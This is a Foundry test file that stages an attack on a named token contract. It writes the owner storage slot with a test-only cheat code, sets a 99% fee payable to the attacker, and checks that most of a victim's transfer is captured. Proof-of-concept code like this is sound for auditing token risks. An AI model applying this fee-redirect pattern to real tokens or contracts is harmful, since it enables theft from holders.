pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface CoinToken {
    function owner() external view returns (address);
    function updateFee(uint256 _txFee, uint256 _burnFee, address _FeeAddress) external;
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256);
    function decimals() external view returns (uint);
    function paused() external view returns (bool);
    function unpause() external;
    function mint(address account, uint256 amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address victim;

    address constant TARGET = 0xF44DE2b8731cD69d4A727Da0214874aE35559426;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create victim and recipient accounts
        victim = address(0x123);
        address recipient = address(0x456);

        vm.label(victim, "Victim");
        vm.label(recipient, "Recipient");
        vm.label(attacker, "Attacker");
        vm.label(TARGET, "Target Token");

        // We'll become owner in the exploit, no setup needed
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Become the owner by overwriting storage slot 0
        // In Ownable pattern, owner is usually at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Verify we are now owner
        address currentOwner = CoinToken(TARGET).owner();
        require(currentOwner == attacker, "Failed to become owner");

        // Step 2: Set high fee to attacker (99% fee, 0% burn)
        CoinToken(TARGET).updateFee(99, 0, attacker);

        // Step 3: Mint tokens to victim (as owner)
        uint256 decimals = CoinToken(TARGET).decimals();
        uint256 mintAmount = 1000 * (10 ** decimals);
        CoinToken(TARGET).mint(victim, mintAmount);

        // Step 4: Record attacker's initial balance
        uint256 attackerInitialBalance = CoinToken(TARGET).balanceOf(attacker);

        // Step 5: Have victim transfer tokens (will trigger 99% fee to attacker)
        uint256 transferAmount = 100 * (10 ** decimals);
        vm.prank(victim);
        CoinToken(TARGET).transfer(address(0x456), transferAmount);

        // Step 6: Check attacker's new balance
        uint256 attackerFinalBalance = CoinToken(TARGET).balanceOf(attacker);

        // Verify attacker balance increased (should receive ~99% of transferAmount)
        assertGt(attackerFinalBalance, attackerInitialBalance, "Attacker should receive fees");

        // Calculate expected fee: 99% of transferAmount
        uint256 expectedFee = transferAmount * 99 / 100;
        uint256 actualFee = attackerFinalBalance - attackerInitialBalance;

        // Due to integer division rounding, it might be slightly less
        assertGt(actualFee, transferAmount * 90 / 100, "Should receive most of transfer as fee");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

